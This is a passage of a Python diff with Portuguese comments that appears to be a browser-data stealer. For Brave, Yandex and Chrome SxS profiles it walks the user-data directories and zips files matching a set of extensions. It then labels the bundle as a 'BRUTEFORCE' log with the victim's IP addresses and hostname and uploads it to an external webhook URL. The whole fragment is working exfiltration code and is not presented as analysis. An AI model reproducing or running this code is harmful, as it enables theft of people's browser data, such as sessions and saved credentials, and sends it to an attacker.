+
+
+#PATH
+PLATFORM = "BRAVE"
+DIRETORIOS = [LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\DEFAULT" + DB,
+              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 1" + DB,
+              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 2" + DB,
+              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 3" + DB,
+              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 4" + DB,
+              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 5" + DB
+]
+
+
+#ZIP
+for diretorio in DIRETORIOS:
+    if os.path.exists(diretorio):
+        with zipfile.ZipFile(ZIP, 'a') as zipf:
+            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
+                for arquivo in arquivos:
+                    caminho_completo = os.path.join(pasta_atual, arquivo)
+                    extensao = os.path.splitext(arquivo)[1]
+                    if extensao in EXT:
+                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
+                        #
+                        contador = 1
+                        nome_no_zip_original = nome_no_zip
+                        while nome_no_zip in zipf.namelist():
+                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
+                            contador += 1
+                        zipf.write(caminho_completo, nome_no_zip)
+
+
+
+
+
+
+
+
+
+
+
+
+#PATH
+PLATFORM = "YANDEX"
+DIRETORIOS = [LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\DEFAULT" + DB,
+              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 1" + DB,
+              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 2" + DB,
+              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 3" + DB,
+              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 4" + DB,
+              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 5" + DB
+]
+
+
+#ZIP
+for diretorio in DIRETORIOS:
+    if os.path.exists(diretorio):
+        with zipfile.ZipFile(ZIP, 'a') as zipf:
+            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
+                for arquivo in arquivos:
+                    caminho_completo = os.path.join(pasta_atual, arquivo)
+                    extensao = os.path.splitext(arquivo)[1]
+                    if extensao in EXT:
+                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
+                        #
+                        contador = 1
+                        nome_no_zip_original = nome_no_zip
+                        while nome_no_zip in zipf.namelist():
+                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
+                            contador += 1
+                        zipf.write(caminho_completo, nome_no_zip)
+
+
+
+
+
+
+
+
+
+
+
+
+#PATH
+PLATFORM = "CHROME SXS"
+DIRETORIOS = [LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\DEFAULT" + DB,
+              LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 1" + DB,
+              LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 2" + DB,
+              LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 3" + DB,
+              LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 4" + DB,
+              LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 5" + DB
+]
+
+
+#ZIP
+for diretorio in DIRETORIOS:
+    if os.path.exists(diretorio):
+        with zipfile.ZipFile(ZIP, 'a') as zipf:
+            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
+                for arquivo in arquivos:
+                    caminho_completo = os.path.join(pasta_atual, arquivo)
+                    extensao = os.path.splitext(arquivo)[1]
+                    if extensao in EXT:
+                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
+                        #
+                        contador = 1
+                        nome_no_zip_original = nome_no_zip
+                        while nome_no_zip in zipf.namelist():
+                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
+                            contador += 1
+                        zipf.write(caminho_completo, nome_no_zip)
+
+
+#MENGAGEM
+message = f'**BRUTEFORCE #LOG - {PLATFORM.upper()} (STARTED AT: {datetime.datetime.now().replace(second=0, microsecond=0)})**\n'
+message += f'```IP: {ip_address}/{ip_public}        HOSTNAME: {hostname}```\n'
+
+#PAYLOADS
+with open(ZIP, 'rb') as arquivo:
+    payload = {'content': message}
+    files = {'file': arquivo}
+    response = requests.post(WEBHOOK_URL, data=payload, files=files)
